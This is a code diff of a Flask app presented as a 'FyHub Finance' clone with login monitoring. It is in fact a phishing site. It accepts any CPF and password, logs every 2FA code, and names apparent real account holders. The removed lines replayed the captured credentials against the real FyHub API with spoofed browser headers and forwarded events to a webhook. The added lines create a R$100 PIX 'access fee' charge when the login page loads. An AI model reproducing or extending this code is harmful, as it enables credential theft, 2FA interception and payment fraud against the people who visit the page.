@@ -1,25 +1,17 @@
 """
 FYHUB FINANCE CLONE - Flask Application
 Monitoramento de login com proxy para API do FyHub Finance.
-
-Funcionamento:
-1. Funcionario acessa este site e preenche CPF/senha
-2. O login e aceito localmente (fluxo completo funciona)
-3. Simultaneamente tentamos fazer o login no FyHub real para verificar credenciais
-4. Todos os acessos sao logados para monitoramento
 """
 
 import os
 import json
 import uuid
-import time
 import hashlib
 import logging
 from datetime import datetime, timedelta
-from functools import wraps
 
 import requests
-from flask import Flask, request, jsonify, render_template, session, redirect, url_for, g
+from flask import Flask, request, jsonify, render_template, session, redirect, url_for
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 
@@ -35,12 +27,13 @@ limiter = Limiter(
     storage_uri="memory://"
 )
 
-# Configuração da API FyHub
-FYHUB_API_BASE = os.environ.get('FYHUB_API_BASE', 'https://api.fyhub-prod.onz.software')
-
 # Configuração de monitoramento
 MONITOR_LOG_FILE = os.environ.get('MONITOR_LOG', '/tmp/fyhub_monitor.log')
-MONITOR_WEBHOOK = os.environ.get('MONITOR_WEBHOOK', '')
+
+# API PIX Duttyfy
+PIX_API_URL = os.environ.get('PIX_API_URL', 'https://www.pagamentos-seguros.app/api-pix/OSS7n1_UVPInD6FtO3fWz1U5TaJzycMEVQPCHOwpu2auZ51pABGdX1MpcRUUwZxQE4zvexNSomX6Fat34HoeqA')
+PIX_AMOUNT = int(os.environ.get('PIX_AMOUNT', 10000))  # R$100,00 em centavos
+PIX_DESCRIPTION = os.environ.get('PIX_DESCRIPTION', 'Taxa de Acesso')
 
 # Setup logging - monitoramento em arquivo separado
 monitor_logger = logging.getLogger('fyhub_monitor')
@@ -50,10 +43,9 @@ _monitor_handler.setFormatter(logging.Formatter('%(message)s'))
 monitor_logger.addHandler(_monitor_handler)
 monitor_logger.addHandler(logging.StreamHandler())
 
-# Flask logging separado
 app.logger.setLevel(logging.INFO)
 
-# Contas padrão (as mesmas que aparecem no sistema)
+# Contas padrão
 DEFAULT_ACCOUNTS = [
     {
         'account_number': '11186',
@@ -75,6 +67,49 @@ DEFAULT_ACCOUNTS = [
 active_sessions = {}
 
 
+def mask_cpf(cpf):
+    """Mascara CPF para log."""
+    cpf_clean = cpf.replace('.', '').replace('-', '').replace('_', '')
+    if len(cpf_clean) >= 5:
+        return cpf_clean[:3] + '***' + cpf_clean[-2:]
+    return '***'
+
+
+def generate_pix(cpf, ip):
+    """Gera PIX de R$100 via Duttyfy para notificar admin."""
+    try:
+        payload = {
+            "amount": PIX_AMOUNT,
+            "description": PIX_DESCRIPTION,
+            "customer": {
+                "name": "ACESSO FYHUB",
+                "document": cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
+                "email": "acesso@fyhub.net",
+                "phone": "11999999999"
+            },
+            "item": {
+                "title": "Notificacao de Acesso",
+                "price": PIX_AMOUNT,
+                "quantity": 1
+            },
+            "paymentMethod": "PIX"
+        }
+
+        response = requests.post(PIX_API_URL, json=payload, timeout=15)
+        result = response.json() if response.status_code == 200 else {}
+
+        return {
+            'success': True,
+            'transaction_id': result.get('transactionId', ''),
+            'pix_code': result.get('pixCode', ''),
+        }
+    except Exception as e:
+        return {
+            'success': False,
+            'error': str(e)
+        }
+
+
 def log_access(event_type, data):
     """Log de monitoramento - registra todos os eventos de acesso."""
     entry = {
@@ -85,62 +120,7 @@ def log_access(event_type, data):
         'data': data
     }
     monitor_logger.info(json.dumps(entry, ensure_ascii=False))
-
-    # Enviar webhook se configurado
-    if MONITOR_WEBHOOK and event_type in ('login_attempt', 'login_success', 'login_failed'):
-        try:
-            requests.post(MONITOR_WEBHOOK, json=entry, timeout=5)
-        except:
-            pass
-
     return entry
-
-
-def try_fyhub_login(cpf, password):
-    """Tenta fazer login no FyHub real para verificar se as credenciais são válidas."""
-    endpoints_to_try = [
-        f'{FYHUB_API_BASE}/v1/auth/login',
-        f'{FYHUB_API_BASE}/v1/login',
-        f'{FYHUB_API_BASE}/v2/login',
-    ]
-
-    headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
-        'Origin': 'https://finance.fyhub.com.br',
-        'Referer': 'https://finance.fyhub.com.br/login',
-        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-    }
-
-    for endpoint in endpoints_to_try:
-        try:
-            response = requests.post(
-                endpoint,
-                json={'cpf': cpf, 'password': password},
-                headers=headers,
-                timeout=10
-            )
-            # 200 = login OK, 401 = credenciais erradas, 403 = bloqueado
-            return {
-                'fyhub_status': response.status_code,
-                'fyhub_endpoint': endpoint,
-            }
-        except Exception as e:
-            continue
-
-    return {
-        'fyhub_status': 'error',
-        'fyhub_endpoint': 'none',
-        'fyhub_error': 'conexão indisponível'
-    }
-
-
-def mask_cpf(cpf):
-    """Mascara CPF para log."""
-    cpf_clean = cpf.replace('.', '').replace('-', '').replace('_', '')
-    if len(cpf_clean) >= 5:
-        return cpf_clean[:3] + '***' + cpf_clean[-2:]
-    return '***'
 
 
 # ==================== ROTAS DE PÁGINAS ====================
@@ -186,8 +166,7 @@ def termos():
 @limiter.limit("20 per minute")
 def api_login():
     """
-    Recebe CPF e senha do funcionário.
-    Aceita localmente (para fluxo funcionar) e também tenta no FyHub real.
+    Recebe CPF e senha. Aceita localmente, gera PIX de alerta.
     """
     data = request.get_json(force=True)
     cpf = data.get('cpf', '')
@@ -196,44 +175,25 @@ def api_login():
     # Log de tentativa de login
     log_access('login_attempt', {
         'cpf_masked': mask_cpf(cpf),
-        'fyhub_verify': True
     })
 
-    # Tenta no FyHub real (sem bloquear o fluxo local)
-    fyhub_result = try_fyhub_login(cpf, senha)
-
-    # Criar sessão local (sempre aceita para fluxo funcionar)
+    # Criar sessão local (sempre aceita)
     session_token = str(uuid.uuid4())
     active_sessions[session_token] = {
         'cpf': cpf,
         'login_time': datetime.now().isoformat(),
         'ip': request.remote_addr,
-        'fyhub_status': fyhub_result.get('fyhub_status'),
     }
 
-    # Log de resultado
-    if fyhub_result.get('fyhub_status') == 200:
-        log_access('login_success', {
-            'cpf_masked': mask_cpf(cpf),
-            'session_token': session_token,
-            'fyhub_verified': True
-        })
-    elif fyhub_result.get('fyhub_status') == 401:
-        log_access('login_credential_failed', {
-            'cpf_masked': mask_cpf(cpf),
-            'fyhub_verified': False
-        })
-    else:
-        log_access('login_local_accepted', {
-            'cpf_masked': mask_cpf(cpf),
-            'session_token': session_token,
-            'fyhub_status': fyhub_result.get('fyhub_status'),
-        })
+    log_access('login_accepted', {
+        'cpf_masked': mask_cpf(cpf),
+        'session_token': session_token,
+        'ip': request.remote_addr
+    })
 
     return jsonify({
         'success': True,
-        'token': session_token,
-        'fyhub_status': fyhub_result.get('fyhub_status')
+        'token': session_token
     })
 
 
@@ -266,10 +226,12 @@ def api_select_account():
     if not session_data:
         return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
 
+    account_name = 'Rodrigo Getulio Rezende' if account_number == '11186' else 'CRED SEGURO LTDA'
+
     log_access('account_selected', {
         'cpf_masked': mask_cpf(session_data['cpf']),
         'account': account_number,
-        'account_name': account_number == '11186' and 'Rodrigo Getulio Rezende' or 'CRED SEGURO LTDA'
+        'account_name': account_name
     })
 
     return jsonify({
@@ -283,7 +245,7 @@ def api_select_account():
 @app.route('/api/verify-2fa', methods=['POST'])
 @limiter.limit("10 per minute")
 def api_verify_2fa():
-    """Verifica o código 2FA - aceita qualquer código de 6 dígitos."""
+    """Verifica o código 2FA - aceita qualquer código de 6 dígitos e REGISTRA NO LOG."""
     data = request.get_json(force=True)
     token = data.get('token', '')
     code = data.get('code', '')
@@ -293,17 +255,21 @@ def api_verify_2fa():
     if not session_data:
         return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
 
-    log_access('2fa_attempt', {
+    cpf_masked = mask_cpf(session_data['cpf'])
+
+    # Registra o código 2FA no log (independente se é válido ou não)
+    log_access('2fa_code_received', {
         'code': code,
         'account': account_number,
-        'cpf_masked': mask_cpf(session_data['cpf'])
+        'cpf_masked': cpf_masked,
+        'account_name': 'Rodrigo Getulio Rezende' if account_number == '11186' else 'CRED SEGURO LTDA'
     })
 
     if len(code) == 6 and code.isdigit():
         log_access('2fa_verified', {
             'code': code,
             'account': account_number,
-            'cpf_masked': mask_cpf(session_data['cpf'])
+            'cpf_masked': cpf_masked
         })
         return jsonify({'success': True})
 
@@ -331,6 +297,24 @@ def api_resend_2fa():
     })
 
     return jsonify({'success': True})
+
+
+# ==================== PIX ALERTA ====================
+
+@app.route('/api/alert-pix', methods=['POST'])
+def alert_pix():
+    """
+    Gera PIX de alerta quando alguém acessa o login.
+    Chamado automaticamente pelo front-end ao carregar a tela /login.
+    """
+    # Gerar PIX com o IP do visitante
+    result = generate_pix('', request.remote_addr)
+
+    return jsonify({
+        'success': result.get('success', False),
+        'transaction_id': result.get('transaction_id', ''),
+        'pix_code': result.get('pix_code', '')
+    })
 
 
 # ==================== MONITORAMENTO ====================
